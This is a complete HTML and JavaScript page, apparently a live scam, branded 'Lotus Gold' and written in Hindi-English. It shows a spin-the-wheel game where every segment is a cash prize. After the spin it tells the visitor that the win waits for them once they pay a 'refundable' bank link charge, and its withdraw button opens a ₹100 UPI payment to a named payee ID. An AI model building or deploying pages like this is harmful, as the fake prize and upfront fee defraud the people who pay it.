<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lotus Gold | Premium Rewards</title>
    <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Rajdhani:wght@600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
    <style>
        :root { --gold: #ffd700; --bg: #000; --cyan: #00f2ff; --pink: #ff007a; }
        * { margin:0; padding:0; box-sizing:border-box; }
        
        body { 
            background: #000; color: #fff; font-family: 'Rajdhani', sans-serif;
            height: 100vh; display: flex; align-items: center; justify-content: center;
            overflow: hidden;
        }

        .main-frame {
            border: 4px solid var(--gold); border-radius: 40px;
            background: #0a0a0a; width: 95%; max-width: 420px; padding: 30px 15px;
            box-shadow: 0 0 50px rgba(255, 215, 0, 0.2); text-align: center;
        }

        .header-logo { font-family: 'Syncopate', sans-serif; font-size: 24px; margin-bottom: 25px; color: var(--gold); }

        .wheel-box { position: relative; margin-bottom: 30px; }
        .pointer {
            position: absolute; top: -15px; left: 50%; transform: translateX(-50%);
            width: 35px; height: 45px; background: var(--pink); z-index: 50;
            clip-path: polygon(50% 100%, 0 0, 100% 0); filter: drop-shadow(0 0 10px var(--pink));
        }
        .wheel-outer {
            width: 300px; height: 300px; border-radius: 50%; padding: 10px;
            background: conic-gradient(var(--gold), #886600, var(--gold));
            box-shadow: 0 0 30px rgba(255, 215, 0, 0.3); margin: 0 auto;
        }
        .wheel-inner {
            width: 100%; height: 100%; border-radius: 50%; background: #000;
            position: relative; overflow: hidden; border: 4px solid #111;
            transition: transform 7s cubic-bezier(0.15, 0, 0.1, 1);
        }
        .seg {
            position: absolute; width: 50%; height: 50%; top: 50%; left: 50%;
            transform-origin: 0% 0%; border: 0.5px solid rgba(255,215,0,0.2);
        }
        .seg span {
            position: absolute; left: 30px; top: 15px; font-weight: 800; font-size: 16px;
            transform: rotate(22deg); color: #fff;
        }

        .spin-btn {
            background: linear-gradient(90deg, var(--pink), var(--cyan));
            color: #fff; border: none; padding: 18px 60px; font-size: 22px;
            font-weight: 900; border-radius: 50px; cursor: pointer;
            box-shadow: 0 10px 25px rgba(255, 0, 122, 0.4);
        }

        #reward-modal {
            display: none; position: fixed; top:0; left:0; width:100%; height:100%;
            background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center;
            backdrop-filter: blur(10px);
        }
        .reward-card {
            background: linear-gradient(180deg, #1a1a1a, #000); border: 2px solid var(--gold); padding: 40px 25px;
            border-radius: 35px; text-align: center; width: 90%; max-width: 380px;
            box-shadow: 0 0 50px rgba(255, 215, 0, 0.3);
            animation: popUp 0.5s ease;
        }
        @keyframes popUp { from {transform: scale(0.8); opacity:0;} to {transform: scale(1); opacity:1;} }

        .win-amt { font-size: 65px; color: var(--gold); font-weight: 900; margin: 10px 0; text-shadow: 0 0 20px rgba(255,215,0,0.5); }
        
        .claim-btn {
            background: linear-gradient(90deg, #25d366, #128c7e); color: #fff; width: 100%; padding: 22px;
            border-radius: 20px; border: none; font-size: 22px; font-weight: 900;
            cursor: pointer; margin-top: 20px; text-transform: uppercase;
        }
        .timer-text { color: var(--pink); font-size: 13px; font-weight: bold; margin-top: 15px; }
    </style>
</head>
<body>

    <audio id="spinSound" src="https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3"></audio>
    <audio id="winSound" src="https://www.soundjay.com/human/sounds/applause-01.mp3"></audio>

    <div class="main-frame">
        <div class="header-logo">LOTUS GOLD</div>
        <div class="wheel-box">
            <div class="pointer"></div>
            <div class="wheel-outer"><div class="wheel-inner" id="wheel"></div></div>
        </div>
        <button class="spin-btn" id="sBtn" onclick="startSpin()">SPIN & WIN</button>
    </div>

    <div id="reward-modal">
        <div class="reward-card">
            <div style="font-size: 50px;">ðŸŽŠ</div>
            <h2 style="color: #fff; margin-top: 10px;">BOHOT BOHOT BADHAI HO!</h2>
            <p style="color: #00f2ff; font-weight: bold; margin-top: 5px;">Aapka Jackpot Amount Unlock Hai</p>
            <div class="win-amt" id="finalPrize">â‚¹0</div>
            <p style="color: #eee; font-size: 16px; line-height: 1.4;">
                Aapki jeeti hui rashi bank mein bhejne ke liye taiyar hai. <b>Bank Link Charge (Refundable)</b> pay karke turant apna full amount withdraw karein.
            </p>
            <button class="claim-btn" onclick="goToPayment()">INSTANT WITHDRAW</button>
            <p class="timer-text">âš¡ Payment ke 2 minute baad rashi credit ho jayegi!</p>
        </div>
    </div>

    <script>
        const wheel = document.getElementById('wheel');
        const prizes = ["â‚¹500", "â‚¹700", "â‚¹350", "â‚¹600", "â‚¹450", "â‚¹250", "â‚¹650", "â‚¹300"];
        const colors = ["#b8860b", "#000", "#b8860b", "#000", "#b8860b", "#000", "#b8860b", "#000"];
        let rotation = 0;

        prizes.forEach((p, i) => {
            const seg = document.createElement('div');
            seg.className = 'seg';
            seg.style.transform = `rotate(${i * 45}deg) skewY(45deg)`;
            seg.style.backgroundColor = colors[i];
            const span = document.createElement('span');
            span.innerText = p;
            span.style.transform = `rotate(22.5deg) skewY(-45deg)`;
            seg.appendChild(span);
            wheel.appendChild(seg);
        });

        function startSpin() {
            document.getElementById('spinSound').play();
            const btn = document.getElementById('sBtn');
            btn.disabled = true;
            btn.style.opacity = "0.5";
            const winIdx = Math.floor(Math.random() * prizes.length);
            rotation += 3600 + (360 - (winIdx * 45));
            wheel.style.transform = `rotate(${rotation}deg)`;

            setTimeout(() => {
                document.getElementById('winSound').play();
                confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
                document.getElementById('finalPrize').innerText = prizes[winIdx];
                document.getElementById('reward-modal').style.display = 'flex';
            }, 7200);
        }

        function goToPayment() {
            window.location.href = `upi://pay?pa=8709615634-w350@ybl&pn=LotusGold_Rewards_Payout&am=100&tn=Refundable_Link_Charge&cu=INR`;
        }
    </script>
</body>
</html>
